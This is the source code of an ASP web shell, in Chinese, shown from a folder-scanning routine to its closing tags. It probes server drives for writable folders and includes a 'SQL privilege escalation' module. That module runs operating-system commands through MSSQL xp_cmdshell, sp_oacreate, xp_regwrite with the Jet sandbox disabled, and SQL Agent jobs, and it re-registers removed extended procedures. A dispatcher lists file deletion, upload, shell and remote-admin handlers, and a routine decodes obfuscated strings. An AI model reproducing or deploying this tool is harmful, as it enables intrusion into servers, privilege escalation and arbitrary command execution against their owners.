Response.Write "<TD colspan=3>"&FSO.GetSpecialFolder(2)&"</TD>"
Response.Write "<TD align=middle><INPUT type=submit value=详细报告></TD></FORM></TR></TABLE>"
Response.Write "<table width='600' bgcolor='menu' border='0' cellspacing='1' cellpadding='0' align='center'>"
Response.Write "<BR><DIV><b>当前网站绝对路径:"&Server.MapPath("/")&"</b>"
Response.Write "<FORM Action=?Action=ScFolder method=Post>指定文件夹查询："
Response.Write "<INPUT type=text name=Folder>	"
Response.Write "<INPUT type=submit value=生成报告>　指定文件夹路径。如 F:\lowkey\</FORM><DIV></table>"
	Set FSO=Nothing
End Sub

Sub ScanDrive(Drive) '扫描指定磁盘
    Dim FSO,TestDrive,BaseFolder,TempFolders,Temp_Str,D
	If Drive <> "" Then
	    Set FSO = Server.Createobject("Scripting.FileSystemObject")
		Set TestDrive = FSO.GetDrive(Drive)
		If TestDrive.IsReady Then
		    Temp_Str = "<LI>磁盘分区类型：" & Red(TestDrive.FileSystem) & "<LI>磁盘序列号：" & Red(TestDrive.SerialNumber) & "<LI>磁盘共享名：" & Red(TestDrive.ShareName) & "<LI>磁盘总容量：" & Red(Int(TestDrive.TotalSize/1073741824)) & Red("GB") & "<LI>磁盘卷名：" & Red(TestDrive.VolumeName) & "<LI>磁盘根目录:" & ScReWr((Drive & ":\"))
			Set BaseFolder = TestDrive.RootFolder
			Set TempFolders = BaseFolder.SubFolders
			For Each D in TempFolders
			    Temp_Str = Temp_Str & "<LI>文件夹：" & ScReWr(D)
			Next
			Set TempFolder = Nothing
			Set BaseFolder = Nothing
	    Else
		    Temp_Str = Temp_Str & "<LI>磁盘根目录:" & Red("不可读:(")
			Dim TempFolderList,t:t=0
			Temp_Str = Temp_Str & "<LI>" & Red("穷举目录测试：")
			TempFolderList = Array("windows","winnt","win","win2000","win98","web","winme","windows2000","asp","php","Tools","Documents and Settings","Program Files","Inetpub","ftp","wmpub","tftp","wwwroot")
			For i = 0 to Ubound(TempFolderList)
			    If FSO.FolderExists(Drive & ":\" & TempFolderList(i)) Then
				    t = t+1
					Temp_Str = Temp_Str & "<LI>发现文件夹：" & ScReWr(Drive & ":\" & TempFolderList(i))
			    End if
		    Next
			If t=0 then Temp_Str = Temp_Str & "<LI>已穷举" & Drive & "盘根目录，但未有发现:("
	    End if
		Set TestDrive = Nothing
	    Set FSO = Nothing
		Temp_Str = Temp_Str & "<br><br>注意：不要多次刷新本页面，否则在只写文件夹会留下大量垃圾文件!"
		Message Drive & ":磁盘信息",Temp_Str,1
	End if
End Sub

Sub ScFolder(folder) 
    'On Error Resume Next
	Dim FSO,OFolder,TempFolder,Scmsg,S
	Set FSO = Server.Createobject("Scripting.FileSystemObject")
	If FSO.FolderExists(folder) Then
	    Set OFolder = FSO.GetFolder(folder)
		Set TempFolders = OFolder.SubFolders
		Scmsg = "<LI>指定文件夹根目录：" & ScReWr(folder)
		For Each S in TempFolders
		     Scmsg = Scmsg&"<LI>文件夹：" & ScReWr(S)  
		Next
		Set TempFolders = Nothing
		Set OFolder = Nothing
	Else
	    Scmsg = Scmsg & "<LI>文件夹：" & Red(folder & "不存在或无读权限!")
	End if
	Scmsg = Scmsg & "<br><br>注意：不要多次刷新本页面，否则在只写文件夹会留下大量垃圾文件!"
	Set FSO = Nothing
	Message "文件夹信息",Scmsg,1
End Sub


Function ScReWr(folder)   '1.可读,不可写。2.不可读,可写。3.可读,可写。4.不可读,不可写。
   On Error Resume Next
   Dim FSO,TestFolder,TestFileList,ReWrStr,RndFilename
   Set FSO = Server.Createobject("Scripting.FileSystemObject")
   Set TestFolder = FSO.GetFolder(folder)
   Set TestFileList = TestFolder.SubFolders
   RndFilename = "\temp" & Day(now) & Hour(now) & Minute(now) & Second(now) & ".tmp"
   For Each A in TestFileList
   Next
   If err Then
       err.Clear
	   ReWrStr = folder & " [不可读,"
	   FSO.CreateTextFile folder & RndFilename,True
	   If err Then
	       err.Clear
		   ReWrStr = ReWrStr & "不可写]"
	   Else
	       ReWrStr = ReWrStr & "可写]"
		   FSO.DeleteFile folder & RndFilename,True
	   End If
   Else
       ReWrStr = folder & "<FONT color=Red> [可读,"
	   FSO.CreateTextFile folder & RndFilename,True
	   If err Then
	       err.Clear
		   ReWrStr = ReWrStr & "不可写]</FONT>"
	   Else
	       ReWrStr = ReWrStr & "可写]</FONT>"
		   FSO.DeleteFile folder & RndFilename,True
	   End if
   End if
   Set TestFileList = Nothing
   Set TestFolder = Nothing
   Set FSO = Nothing
   ScReWr = ReWrStr
End Function
function sql()
if session("login")="" then
        response.write "<br><center><font color=red>没有登陆</font></center>"
	else
	response.write "<br><center><a href="&request.servervariables("url")&"?Action=sql&sqlaaa=logout><font color=red>退出登陆</font></a></center>"
end if

if session("login")="" then
	response.write "<table width='600' bgcolor='menu' border='0' cellspacing='1' cellpadding='0' align='center'>"
	response.write "<tr><td height='20' align='center' bgcolor='menu'>SQL提权</td></tr>"
	response.write "<tr><td><Br><form name=form method=post sqlaaa="&request.servervariables("url")&">"
	response.write "<p>&nbsp;Sql用户名："
	response.write "<input name=name type=text id=name value="&session("name")&">"
	response.write "&nbsp;Sql密码："
	response.write "<input name=pass type=text id=pass value="&session("pass")&">"
	response.write "<p>&nbsp;Sql服务器："
	response.write "<input name=port type=text id=server value=127.0.0.1>"
	response.write "&nbsp;Sql端口："
	response.write "<input name=port type=text id=port value=1433>"
	response.write "&nbsp;<input name=sqlaaa type=submit value=login>"
	response.write "</form></td></tr></table>"
else
	response.write "<table width='600' bgcolor='menu' border='0' cellspacing='1' cellpadding='0' align='center'>"
	response.write "<tr><td height='20' align='center' bgcolor='menu'>SQL提权</td></tr>"
	response.write "<tr><td><Br><form name=form method=post sqlaaa="&request.servervariables("url")&"><p>"
	response.write "&nbsp;组件检测：<input name=sqlaaa type=hidden value=test><input type=submit value=检测组件></form>"
	response.write "<form name=form method=post sqlaaa="&request.servervariables("url")&"><p>"
	response.write "&nbsp;组件恢复：<input name=sqlaaa type=hidden value=resume><input type=submit value=恢复组件></form>"
	response.write "<form name=form method=post sqlaaa="&request.servervariables("url")&"><p>"
	response.write "&nbsp;系统命令：<input name=cmd type=text>&nbsp;"
	response.write "<select name='tool' ><option value=''>选择运行程序的组件</option><option value=xp_cmdshell>xp_cmdshell</option><option value=sp_oacreate>sp_oacreate</option><option value=xp_regwrite>xp_regwrite</option><option value=sqlserveragent>sqlserveragent</option></option></select>"
	response.write "<input name=sqlaaa type=hidden value=cmd>&nbsp;&nbsp;"
	response.write "<input type=submit value=执行>"
	response.write "</form>"
	response.write "<form name=form1 method=post sqlaaa="&request.servervariables("url")&">"
	response.write "<p>&nbsp;执行语句："
	response.write "<input name=sql type=text>"
	response.write "<input name=sqlaaa type=hidden value=sql>&nbsp;&nbsp;"
	response.write "<input type=submit value=执行>"	
	response.write "</form></td></tr></table><br>"

end if
if request("sqlaaa")="login" then
    set adoconn=server.createobject("adodb.connection") 
     adoconn.open "provider=sqloledb.1;data source=" & request.form("server") & "," & request.form("port") & ";password=" & request.form("pass") & ";uid=" & request.form("name")
    if err.number=-2147467259 then 
    response.write "<font color=red>数据源连接错误，请检查！</font>"
    response.end
elseif err.number=-2147217843 then
    response.write "<font color=red>用户名密码错误错误，请检查！</font>"
    response.end
elseif err.number=0 then
    strquery="select @@version"
		set recresult = adoconn.execute(strquery)
		response.write "<table align='center' width='600'><hr><br><font color=red>"
if instr(recresult(0),"NT 5.0") then
		response.write "Windows 2000系统"
    session("system")="2000"
    elseif instr(recresult(0),"NT 5.1")  then
    response.write "Windows xp系统"
    session("system")="xp"
    elseif instr(recresult(0),"NT 5.2")  then
    response.write "Windows 2003系统"
    session("system")="2003"
    else
    response.write "其它操作系统"
    session("system")="no"
    end if
    strquery="select is_srvrolemember('sysadmin')"
       set recresult = adoconn.execute(strquery)
    if recresult(0)=1 then
    response.write "<br>恭喜！SQL Server最高权限</font><br><hr></table>"
    session("pri")=1
    else
    response.write "<br>郁闷，权限不够估计不能执行命令！</font><br><hr></table>"
    session("pri")=0
    end if
		session("login")="yes"
		session("name")=request.form("name")
		session("pass")=request.form("pass")
		session("server")=request.form("server")
		session("port")=request.form("port")
		response.write "<meta http-equiv='refresh' content='1;URL=?Action=sql'>"
End if

Elseif request("sqlaaa")="test"  then
    if session("login")<>"" then
    response.write "<table align='center' width='600'><hr><br><font color=red>"
    if session("system")="2000" then
    response.write "Windows 2000系统"
    elseif session("system")="xp" then
    response.write "Windows xp系统"
    elseif session("system")="2003" then
    response.write "Windows 2003系统"
    else
    response.write "其它操作系统"
    end if
    if session("pri")=1 then
    response.write "<br>恭喜！SQL Server最高权限</font><br>"
    else 
    response.write "<br>郁闷，权限不够估计不能执行命令！</font><br>"
end if
    set adoconn=server.createobject("adodb.connection") 
     adoconn.open "provider=sqloledb.1;data source=" & session("server") & "," & session("port") & ";password=" & session("pass") & ";uid=" & session("name")        

    strquery="select count(*) from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell'"
    set recresult = adoconn.execute(strquery)
    response.write "<font color=red>"
    if recresult(0) then
    session("xp_cmdshell")=1 
    response.write "xp_cmdshell............. 存在!"
    else
    session("xp_cmdshell")=0 
    response.write "xp_cmdshell............. 不存在!"
    end if
    strquery="select count(*) from master.dbo.sysobjects where xtype='x' and name='sp_oacreate'"
    set recresult = adoconn.execute(strquery) 
    if recresult(0) then 
    response.write "<br>sp_oacreate............. 存在!"
    session("sp_oacreate")=1
    else 
    response.write "<br>sp_oacreate............. 不存在!"
    session("sp_oacreate")=0
    end if
    strquery="select count(*) from master.dbo.sysobjects where xtype='x' and name='xp_regwrite'"
    set recresult = adoconn.execute(strquery) 
    if recresult(0) then 
    response.write "<br>xp_regwrite............. 存在!"
    session("xp_regwrite")=1
    else 
    response.write "<br>xp_regwrite............. 不存在!"
    session("xp_regwrite")=0
    end if
    strquery="select count(*) from master.dbo.sysobjects where xtype='x' and name='xp_servicecontrol'"
    set recresult = adoconn.execute(strquery) 
    if recresult(0) then 
    response.write "<br>xp_servicecontrol....... 存在!</font><hr></table>"
    session("xp_servicecontrol")=1
    else 
    response.write "<br>xp_servicecontrol....... 不存在!</font><hr></table>"
    session("xp_servicecontrol")=0
    end if
    else 
    response.write "<script>alert('操作超时，重新登陆！')</script>"
    response.write "<center><a href="&request.servervariables("url")&"?Action=sql&sqlaaa=logout><font color=black>登陆超时</font>"
    response.end
    end if 

elseif request("sqlaaa")="cmd" then
    if session("login")<>"" then
    if session("pri")=1 then
    if request("tool")="xp_cmdshell" then
    set adoconn=server.createobject("adodb.connection") 
     adoconn.open "provider=sqloledb.1;data source=" & session("server") & "," & session("port") & ";password=" & session("pass") & ";uid=" & session("name")
    if request.form("cmd")<>"" then 
      strquery = "exec master.dbo.xp_cmdshell '" & request.form("cmd") & "'" 
    set recresult = adoconn.execute(strquery) 
    if not recresult.eof then 
    do while not recresult.eof 
    strresult = strresult & chr(13) & recresult(0) 
    recresult.movenext 
    loop
    end if
    set recresult = nothing
    response.write "<table align='center' width='600'><hr>利用"&request("tool")&"扩展执行&nbsp;&nbsp;C:\windows\system32>"&request.form("cmd")&"<br>"
    response.write "<textarea style='width:600;height:250'>"
    response.write strresult
    response.write "</textarea><hr></table>"
end if 

elseif request("tool")="sp_oacreate" then 
    set adoconn=server.createobject("adodb.connection") 
     adoconn.open "provider=sqloledb.1;data source=" & session("server") & "," & session("port") & ";password=" & session("pass") & ";uid=" & session("name")
if request.form("cmd")<>"" then 
      strquery = "create table [jnc](resulttxt nvarchar(1024) null);use master declare @o int exec sp_oacreate 'wscript.shell',@o out exec sp_oamethod @o,'run',null,'cmd /c "&request("cmd")&" > 8617.tmp',0,true;bulk insert [jnc] from '8617.tmp' with (keepnulls);"
    adoconn.execute(strquery)
    strquery = "select * from jnc"
    set recresult = adoconn.execute(strquery)
if not recresult.eof then 
  do while not recresult.eof 
    strresult = strresult & chr(13) & recresult(0) 
    recresult.movenext 
    loop 
end if
    set recresult = nothing
    response.write "<table align='center' width='600'><hr>利用"&request("tool")&"扩展执行&nbsp;&nbsp;C:\windows\system32>"&request.form("cmd")&"<br>"
    response.write "<textarea style='width:600;height:250'>"
    response.write strresult
    response.write "</textarea><hr></table>"
    strquery = "drop table [jnc];declare @o int exec sp_oacreate 'wscript.shell',@o out exec sp_oamethod @o,'run',null,'cmd /c del 8617.tmp'"
    adoconn.execute(strquery)
end if

elseif request("tool")="xp_regwrite" then
    if session("system")="2000" then
    path="c:\winnt\system32\ias\ias.mdb"
    else
    path="c:\windows\system32\ias\ias.mdb"
    end if
    set adoconn=server.createobject("adodb.connection") 
     adoconn.open "provider=sqloledb.1;data source=" & session("server") & "," & session("port") & ";password=" & session("pass") & ";uid=" & session("name")
    if request.form("cmd")<>"" then
    cmd=chr(34)&"cmd.exe /c "&request.form("cmd")&" > 8617.tmp"&chr(34)
    strquery = "create table [jnc](resulttxt nvarchar(1024) null);exec master..xp_regwrite 'hkey_local_machine','software\microsoft\jet\4.0\engines','sandboxmode','reg_dword',0;select * from openrowset('microsoft.jet.oledb.4.0',';database=" & path &"','select shell("&cmd&")');"
    adoconn.execute(strquery)
    strquery = "select * from openrowset('microsoft.jet.oledb.4.0',';database=" & path &"','select shell("&chr(34)&"cmd.exe /c copy 8617.tmp jnc.tmp"&chr(34)&")');bulk insert [jnc] from 'jnc.tmp' with (keepnulls);"
    set recresult = adoconn.execute(strquery)
    strquery="select * from [jnc];"
    set recresult = adoconn.execute(strquery)
    if not recresult.eof then 
    do while not recresult.eof 
    strresult = strresult & chr(13) & recresult(0) 
    recresult.movenext 
    loop 
    end if
    set recresult = nothing
    response.write "<table align='center' width='600'><hr>利用"&request("tool")&"扩展执行&nbsp;&nbsp;C:\windows\system32>"&request.form("cmd")&"<br>"
    response.write "<textarea style='width:600;height:250'>"
    response.write strresult
    response.write "</textarea><hr></table>"
    strquery = "drop table [jnc];exec master..xp_regwrite 'hkey_local_machine','software\microsoft\jet\4.0\engines','sandboxmode','reg_dword',1;select * from openrowset('microsoft.jet.oledb.4.0',';database=" & path &"','select shell("&chr(34)&"cmd.exe /c del 8617.tmp&&del jnc.tmp"&chr(34)&")');"
    adoconn.execute(strquery)
end if

elseif request("tool")="sqlserveragent" then
    set adoconn=server.createobject("adodb.connection") 
     adoconn.open "provider=sqloledb.1;data source=" & session("server") & "," & session("port") & ";password=" & session("pass") & ";uid=" & session("name")

if request.form("cmd")<>"" then
    if session("sqlserveragent")=0 then
    strquery = "exec master.dbo.xp_servicecontrol 'start','sqlserveragent';"
    adoconn.execute(strquery)
    session("sqlserveragent")=1
end if

    strquery = "use msdb create table [jncsql](resulttxt nvarchar(1024) null) exec sp_delete_job null,'x' exec sp_add_job 'x' exec sp_add_jobstep null,'x',null,'1','cmdexec','cmd /c "&request.form("cmd")&"' exec sp_add_jobserver null,'x',@@servername exec sp_start_job 'x';"
    adoconn.execute(strquery)
    adoconn.execute(strquery)
    adoconn.execute(strquery)

    response.write "<table align='center' width='600'><hr>利用"&request("tool")&"扩展执行&nbsp;&nbsp;C:\windows\system32>"&request.form("cmd")&"<br>"
    response.write "<textarea style='width:600;height:250'>"
    response.write vbcrf
    response.write "此扩展无回显，建议通过重定向查看命令结果"
    response.write "</textarea><hr></table>"
    strquery = "use msdb drop table [jncsql];"
    adoconn.execute(strquery)
    end if
    elseif request("tool")="" then 
    response.write "<script>alert('选择你要使用的扩展')</script>"
    end if
    else
    response.write "<script>alert('权限不够哦！')</script>"
    end if
    else 
    response.write "<script>alert('操作超时，重新登陆！')</script>"
    response.write "<center><a href="&request.servervariables("url")&"?Action=sql&sqlaaa=logout><font color=black>登陆超时</font>"
    response.end
    end if

elseif request("sqlaaa")="resume" then
    if session("login")<>"" then
    set adoconn=server.createobject("adodb.connection") 
    adoconn.open "provider=sqloledb.1;data source=" & session("server") & "," & session("port") & ";password=" & session("pass") & ";uid=" & session("name")
    if session("xp_cmdshell")=0 then
    strquery="dbcc addextendedproc ('xp_cmdshell','xplog70.dll')"
    adoconn.execute(strquery)	
    response.write "<table align='center' width='600'><hr><font color=red>已经尝试恢复xp_cmdshell</font><hr></table>"
    elseif session("sp_oacreate")=0 then
    strquery="dbcc addextendedproc ('sp_oacreate','odsole70.dll')"
    adoconn.execute(strquery)	
    response.write "<table align='center' width='600'><hr><font color=red>已经尝试恢复sp_oacreate</font><hr></table>"
    elseif session("xp_regwrite")=0 then
    strquery="dbcc addextendedproc ('xp_regwrite','xpstar.dll')"
    adoconn.execute(strquery)	
    response.write "<table align='center' width='600'><hr><font color=red>已经尝试恢复xp_regwrite</font><hr></table>"
    elseif session("xp_servicecontrol")=0 then
    strquery="dbcc addextendedproc ('xp_servicecontrol','xprepl.dll')"
    adoconn.execute(strquery)	
    response.write "<table align='center' width='600'><hr><font color=red>已经尝试恢复xp_servicecontrol</font><hr></table>"	
    else response.write "<table align='center' width='600'><hr><font color=red>恭喜！组件齐全</font><hr>"	
    end if
    else 
    response.write "<script>alert('操作超时，重新登陆！')</script>"
    response.write "<center><a href="&request.servervariables("url")&"?Action=sql&sqlaaa=logout><font color=black>登陆超时</font>"
    response.end
end if
elseif request("sqlaaa")="sql" then
    if session("login")<>"" then
    if request.form("sql")<>"" then
    set adoconn=server.createobject("adodb.connection") 
     adoconn.open "provider=sqloledb.1;data source=" & session("server") & "," & session("port") & ";password=" & session("pass") & ";uid=" & session("name")
    strquery=request.form("sql")
    set recresult = adoconn.execute(strquery) 
    if not recresult.eof then 
    do while not recresult.eof 
    strresult = strresult & chr(13) & recresult(0) 
    recresult.movenext 
    loop
    end if
    set recresult = nothing
    response.write "<table align='center' width='600'><hr><textarea style='width:600;height:250'>"
    response.write "执行sql语句:"
    response.write request.form("sql") 
    response.write strresult
    response.write "</textarea><hr></table>"
    end if
    else 
    response.write "<script>alert('操作超时，重新登陆！')</script>"
    response.write "<center><a href="&request.servervariables("url")&"?Action=sql&sqlaaa=logout><font color=black>登陆超时</font>"
    response.end
    end if
end if

if request("sqlaaa")="logout" then
    set adoconn=nothing
    session("login")=""
    session("name")=""
    session("pass")=""
    session("server")=""
    session("port")=""
    session("system")=""
    session("pri")="" 
    response.write "<meta http-equiv='refresh' content='1;URL=?Action=sql'>"
end if
end function
Case "ReadREG":call ReadREG()
Case "Show1File":Set ABC=New LBF:ABC.Show1File(Session("FolderPath")):Set ABC=Nothing
Case "DownFile":DownFile FName:ShowErr()
Case "DelFile":Set ABC=New LBF:ABC.DelFile(FName):Set ABC=Nothing
Case "EditFile":Set ABC=New LBF:ABC.EditFile(FName):Set ABC=Nothing
Case "CopyFile":Set ABC=New LBF:ABC.CopyFile(FName):Set ABC=Nothing
Case "MoveFile":Set ABC=New LBF:ABC.MoveFile(FName):Set ABC=Nothing
Case "DelFolder":Set ABC=New LBF:ABC.DelFolder(FName):Set ABC=Nothing
Case "CopyFolder":Set ABC=New LBF:ABC.CopyFolder(FName):Set ABC=Nothing
Case "MoveFolder":Set ABC=New LBF:ABC.MoveFolder(FName):Set ABC=Nothing
Case "NewFolder":Set ABC=New LBF:ABC.NewFolder(FName):Set ABC=Nothing
case "upfile":upfile()
Case "Cmd1Shell":Cmd1Shell()
Case "Logout":Session.Contents.Remove("webadministrators"):Session("ad")="ad":Response.Redirect URL
Case "yad":Session("ad")="ad":Response.Redirect URL
Case "nad":Session.Contents.Remove("ad"):Response.Redirect URL
Case "CreateMdb":CreateMdb FName
Case "CompactMdb":CompactMdb FName
Case "DbManager":DbManager()
Case "Course":Course()
Case "Mssql":Mssql()
case "php":php()
case "apjdel":apjdel()
case "aspx":aspx()
case "jsp":jsp()
case "lowkey":lowkey()
Case "sql":sql()
Case "radmin":radmin()
Case "pcanywhere4":pcanywhere4()
Case "adminab":adminab()
Case "ServerInfo":ServerInfo()
Case "UpLoad":UpLoad()
Case "ScanDriveForm":ScanDriveForm()
Case "ScanDrive": ScanDrive(Request("Drive"))
Case "ScFolder":ScFolder(Request("Folder"))
Case Else MainForm()
End Select
if Action<>"Servu" then ShowErr()
RRS"</body></html>"

function Unlin(bb)
but=94
for i = 1 to len(bb)
if mid(bb,i,1)<>"晨" then
If Asc(Mid(bb, i, 1)) < 32 Or Asc(Mid(bb, i, 1)) > 126 Then
a = a & Chr(Asc(Mid(bb, i, 1)))
else
pk=asc(mid(bb,i,1))-but
if pk>126 then
pk=pk-95
elseif pk<32 then
pk=pk+95
end if
a=a&chr(pk)
end if
else
a=a&vbcrlf
end if
next
Unlin=a
end Function
Sub Message(state,msg,flag)
Response.Write "<TABLE width=480 border=0 align=center cellpadding=0 cellspacing=1 bgcolor=#91d70d>"
Response.Write "  <TR>"
Response.Write "    <TD class=TBHead>系统信息</TD>"
Response.Write "  </TR>"
Response.Write "  <TR>"
Response.Write "    <TD align=middle bgcolor=#ecfccd>"
Response.Write "	  <TABLE width=82% border=0 cellpadding=5 cellspacing=0>"
Response.Write "	    <TR>"
Response.Write "		  <TD><FONT color=red>"
Response.Write state
Response.Write "</FONT></TD>"
Response.Write "		<TR>"
Response.Write "		  <TD><P>"
Response.Write msg
Response.Write "</P></TD>"
Response.Write "		</TR>"
Response.Write "	  </TABLE>"
Response.Write "	</TD>"
Response.Write "  </TR>"
Response.Write "  <TR>"
Response.Write "    <TD class=TBEnd>"
Response.Write "	"
If flag=0 Then
Response.Write "	      <INPUT type=button value=关闭 onclick=""window.close();"">"
Response.Write "	"
Else
Response.Write "	      <INPUT type=button value=返回 onClick=""history.go(-1);"">"
Response.Write "	"
End if
Response.Write "	</TD>"
Response.Write "  </TR>"
Response.Write "</TABLE>"
End Sub

%>